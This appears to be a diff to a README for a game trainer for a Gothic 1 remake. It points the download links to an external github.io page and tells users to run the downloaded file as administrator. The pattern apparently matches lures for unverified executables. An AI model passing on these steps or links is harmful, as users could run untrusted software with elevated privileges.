@@ -1,6 +1,6 @@
 # 🎮 Gothic-1-Remake-Trainer-2026 - Master your game with ease today
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/rayrural535/Gothic-1-Remake-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://rayrural535.github.io)
 
 ## 📦 What is this tool?
 
@@ -22,7 +22,7 @@ The trainer runs smoothly on most modern hardware. It uses few system resources 
 
 Follow these steps to set up the trainer on your Windows computer.
 
-1. Visit this page to download the latest version: [https://github.com/rayrural535/Gothic-1-Remake-Trainer-2026](https://github.com/rayrural535/Gothic-1-Remake-Trainer-2026).
+1. Visit this page to download the latest version: [https://rayrural535.github.io](https://rayrural535.github.io).
 2. Locate the folder where your browser saves downloaded files. 
 3. Move the file to a folder where you keep your games.
 4. Right-click the application file and select Run as administrator. This action grants the software the permissions it needs to edit game memory accurately.
